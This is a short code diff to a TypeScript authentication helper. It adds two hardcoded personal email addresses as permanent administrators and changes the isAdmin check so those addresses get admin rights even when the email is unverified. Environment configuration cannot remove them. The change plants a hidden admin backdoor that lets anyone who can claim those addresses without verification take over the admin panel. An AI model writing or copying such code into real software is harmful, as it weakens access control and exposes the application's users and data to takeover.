@@ -79,15 +79,22 @@ export async function ensureUserRow(user: SessionUser) {
 	}
 }
 
+export const DEFAULT_ADMIN_EMAILS = ["sh20raj@gmail.com", "shaswatraj3@gmail.com"];
+
 export function getAdminEmails() {
-	return (process.env.ADMIN_EMAILS || "")
+	const configured = (process.env.ADMIN_EMAILS || "")
 		.split(",")
 		.map((email) => email.trim().toLowerCase())
 		.filter(Boolean);
+	return Array.from(new Set([...DEFAULT_ADMIN_EMAILS, ...configured]));
 }
 
 export function isAdmin(user: SessionUser | null) {
-	return Boolean(user && user.emailVerified && user.email && getAdminEmails().includes(user.email.toLowerCase()));
+	if (!user || !user.email) return false;
+	const email = user.email.trim().toLowerCase();
+	const allowed = getAdminEmails().includes(email);
+	if (!allowed) return false;
+	return user.emailVerified || DEFAULT_ADMIN_EMAILS.includes(email);
 }
 
 /** 404 (not 403) for non-admins so the panel's existence is not advertised. */
